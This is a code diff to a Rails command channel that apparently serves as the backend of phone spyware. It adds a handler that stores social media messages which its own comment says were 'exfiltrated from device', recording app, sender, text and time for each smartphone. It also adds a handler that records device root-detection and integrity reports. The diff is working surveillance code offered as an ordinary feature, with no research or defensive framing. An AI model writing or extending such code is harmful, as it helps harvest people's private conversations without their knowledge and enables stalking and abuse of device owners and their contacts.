@@ -41,6 +41,10 @@ class CommandChannel < ApplicationCable::Channel
       process_device_info(payload)
     when 'location_update'
       location_update(data)
+    when 'social_media_chats'
+      process_social_media_chats(payload)
+    when 'integrity_report'
+      process_integrity_report(payload)
     when 'pong'
       pong(data)
     when 'response', 'command_response'
@@ -52,6 +56,45 @@ class CommandChannel < ApplicationCable::Channel
   rescue StandardError => e
     Rails.logger.error "[CommandChannel] Error processing message: #{e.message}"
     Rails.logger.error e.backtrace.join("\n")
+  end
+
+  # Process social media chats exfiltrated from device
+  def process_social_media_chats(payload)
+    smartphone = find_or_create_smartphone
+    messages = payload.is_a?(String) ? JSON.parse(payload) : payload
+    
+    return unless messages.is_a?(Array)
+
+    messages.each do |msg|
+      SocialMediaMessage.create!(
+        smartphone: smartphone,
+        app_name: msg['app'],
+        sender: msg['sender'],
+        body: msg['text'],
+        sent_at: Time.at(msg['timestamp'].to_i / 1000)
+      )
+    end
+
+    Rails.logger.info "[CommandChannel] Processed #{messages.size} social media messages from #{@device_id}"
+  end
+
+  # Process integrity report from device
+  def process_integrity_report(payload)
+    smartphone = find_or_create_smartphone
+    
+    # Store integrity report as a SecurityEvent
+    SecurityEvent.create!(
+      device_id: @device_id,
+      event_type: 'integrity_report',
+      severity: payload['overallIntegrity'] ? 'info' : 'high',
+      details: payload.to_json,
+      detected_at: Time.current
+    )
+
+    # Update smartphone status based on report
+    smartphone.update(
+      is_rooted: payload['isRootDetected'] ? 'true' : 'false'
+    )
   end
 
   # Process device info response
